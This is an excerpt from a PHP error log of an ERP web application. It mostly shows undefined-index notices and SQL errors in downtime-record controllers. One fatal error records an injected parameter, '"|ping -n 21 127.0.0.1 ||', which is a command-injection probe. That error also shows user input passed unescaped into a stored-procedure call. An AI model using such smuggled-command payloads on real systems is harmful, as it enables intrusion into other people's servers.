[04-Jan-2023 14:29:34 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""|ping -n 21 127.0.0.1 ||")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '21 127.0.0.1 ||")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:05 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:06 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:07 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:39 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:55:47 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:47 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:56:19 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
[04-Jan-2023 14:57:07 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
[04-Jan-2023 14:57:15 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:57:23 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:57:23 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:57:55 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
[04-Jan-2023 14:58:27 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
Stack trace:
#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
#3 {main}
  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
[04-Jan-2023 14:58:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
[04-Jan-2023 14:59:07 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:59:07 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
